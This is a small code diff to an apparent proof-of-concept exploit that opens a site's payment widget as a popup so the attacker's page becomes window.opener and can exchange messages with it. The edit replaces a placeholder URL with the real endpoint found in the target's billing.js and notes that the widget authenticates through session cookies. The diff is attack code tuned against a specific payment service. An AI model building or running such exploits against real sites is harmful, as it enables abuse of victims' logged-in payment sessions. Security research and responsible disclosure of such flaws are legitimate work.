@@ -66,10 +66,11 @@ window.addEventListener('message', function(e) {
 function runPoC() {
   log('Opening paywidget as popup (attacker becomes window.opener)...', 'warn');
 
-  // Open the paywidget popup — attacker's page IS window.opener
-  // Adjust URL params as needed (method name, locale etc)
+  // Real URL discovered from billing.js source:
+  // window.open(`/paywidget/form?locale=${lang}&origin_type=${k}`)
+  // Only needs locale + origin_type — auth is via session cookies
   paywidgetWindow = window.open(
-    TARGET + '/paywidget/form',
+    TARGET + '/paywidget/form?locale=en&origin_type=deposit',
     'paywidget',
     'width=500,height=700,left=100,top=100'
   );
